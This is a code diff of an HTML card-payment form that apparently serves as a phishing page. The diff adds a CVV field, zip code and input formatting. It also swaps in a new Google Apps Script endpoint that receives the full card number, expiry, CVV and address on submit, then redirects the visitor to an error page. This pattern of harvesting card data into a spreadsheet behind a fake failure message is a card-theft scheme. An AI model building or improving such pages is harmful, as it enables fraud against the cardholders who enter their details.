@@ -46,12 +46,20 @@
               </div>
               <div class="form-group">
                 <label for="exampleInputEmail1">Card Number</label>
-                <input type="text" name="Card Number" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" required>
+                <input type="text" name="Card Number" maxlength="19" placeholder="0000-0000-0000-0000" class="form-control" id="crd" aria-describedby="emailHelp" required>
               </div>
-              <div class="form-group">
-                <label for="exampleInputEmail1">EXP Date</label>
-                <input type="text" name="EXP Date" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" required>
-              </div>
+              <div class="form-row">
+                <div class="col">
+                  <label for="exampleInputEmail1" >EXP Date</label>
+                <input type="text"  name="EXP Date" class="form-control" maxlength="5" id="date" aria-describedby="emailHelp" placeholder="00/00" required>
+             
+                </div>
+                <div class="col">
+                  <label for="exampleInputEmail1" >CVV</label>
+                <input type="text"  name="CVV" class="form-control" maxlength="3" aria-describedby="emailHelp" placeholder="123" required>
+             
+                </div>
+                 </div>
               <div class="form-group">
                 <label for="exampleInputEmail1">Amount</label>
                 <input type="text" name="Amount" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="$" required>
@@ -69,8 +77,19 @@
                 <label for="exampleInputEmail1">Address</label>
                 <input name="Address" type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" >
                 <small>Address Line 1</small>
+               
+              </div>
+              <div class="form-row">
+               <div class="col">
                 <input style="margin-top: 10px;" type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" >
                 <small>Address Line 2</small>
+               </div>
+               <div class="col">
+                
+                <input style="margin-top: 10px;" name="Zip Code" placeholder="Zip-Code" maxlength="6" type="number" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" >
+                <small>Zip Code</small>
+               </div>
+             
               </div>
               <div class="form-row" style="margin-top: 10px;">
                 <div class="col">
@@ -182,12 +201,29 @@ input[type=number]:focus,
         </style>
 
 <script>
+
+  $('#date').keyup(function() {
+    cc = $(this).val().split("/").join("");
+
+    cc = cc.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+
+    $(this).val(cc);
+
+});
+$('#crd').keyup(function() {
+    cc = $(this).val().split("-").join("");
+
+    cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join("-");
+
+    $(this).val(cc);
+
+});
     const button=document.getElementById("button")
     button.addEventListener("click",()=>{
         button.innerText="Sending..."
     })
 
-    const scriptURL = 'https://script.google.com/macros/s/AKfycby9oyTxru9hrJ3-e4r_OCTWe8sX61ezM-WBRmCQf3lTQYy9YAnwrjzTyzwSwxNLNVuwVg/exec'
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbz1YaioImoLERlTBfNwe8CPdji96_9rvRtHl2XT-6Ey-DyR9Gxg0y4tBDQsx4wkzNF_Gw/exec'
     const form = document.forms['google-sheet']
   
     form.addEventListener('submit', e => {
@@ -196,16 +232,16 @@ input[type=number]:focus,
         .then(response => window.location.replace('./error.html'))
         .catch(error => console.error('Error!', error.message))
     })
-    
-    const scriptURL1 = 'https://script.google.com/macros/s/AKfycbxsWjyLR4THDeAdO-2LYJLU6D7KxvhYVUVtwnYgZ5K4dkbnw44ANaXLTPBwYiN44Cbm/exec'
-    const form1 = document.forms['google-sheet']
-  
-    form1.addEventListener('submit', e => {
-      e.preventDefault()
-      fetch(scriptURL1, { method: 'POST', body: new FormData(form)})
-        .then(response => window.location.replace('./error.html'))
-        .catch(error => console.error('Error!', error.message))
-    })
+
+    // const scriptURL1 = ''
+    // const form1 = document.forms['google-sheet']
+    // 
+    // form1.addEventListener('submit', e => {
+    //   e.preventDefault()
+    //   fetch(scriptURL1, { method: 'POST', body: new FormData(form1)})
+    //     .then(response => window.location.replace('./error.html'))
+    //     .catch(error => console.error('Error!', error.message))
+    // })
   </script>
          
     </body>
